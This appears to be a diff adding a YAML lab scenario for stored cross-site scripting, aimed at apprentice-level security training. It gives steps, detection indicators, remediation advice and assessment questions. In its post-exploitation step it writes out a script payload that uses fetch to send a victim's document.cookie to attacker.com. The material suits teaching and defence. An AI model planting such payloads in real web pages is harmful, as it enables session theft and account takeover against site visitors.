@@ -1,0 +1,91 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Stored XSS in HTML context with no encoding"
+id: "xss-stored-html-001"
+category: "xss"
+subcategory: "stored"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers stored XSS where user input is stored in the backend
+  (e.g., database) and later displayed to other users without encoding.
+  The attacker's payload executes when any victim views the stored data.
+
+learning_objectives:
+  - Understand stored XSS and its impact
+  - Identify input fields that persist data (comments, posts, profiles)
+  - Inject a persistent payload that affects other users
+
+tools:
+  - Burp Suite
+  - curl
+  - Browser developer tools
+
+prerequisites:
+  - Basic understanding of HTML/JavaScript
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify persistent input fields"
+    commands:
+      - "# Look for comment boxes, profile fields, forum posts"
+      - "# Submit a test string and check if it appears on other pages"
+    expected_output: "Input is reflected on other users' views"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject a JavaScript payload into the stored data"
+    commands:
+      - "# Use payload: <script>alert('Stored XSS')</script>"
+      - "# Submit and then view the page where it is displayed"
+    expected_output: "JavaScript alert executes for all visitors"
+    detection: "Web application logs may show the payload in stored data"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Steal session cookies or perform actions on behalf of victims"
+    commands:
+      - "# Payload: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
+    expected_output: "Cookie sent to attacker's server"
+    detection: "Attacker server logs show incoming requests"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with suspicious script tags"
+  log_indicators:
+    - "Web server logs with unusual stored data"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Encode all user input before rendering"
+    - "Validate and sanitize input on the server side"
+  long_term:
+    - "Use a Content Security Policy (CSP)"
+    - "Implement input validation allowlists"
+
+variables:
+  target_url: "http://example.com/comment"
+
+assessment_questions:
+  - "What is stored XSS and why is it more dangerous than reflected?"
+  - "How can you prevent stored XSS?"
+  - "What are common storage locations for XSS payloads?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+    title: "XSS Filter Evasion"
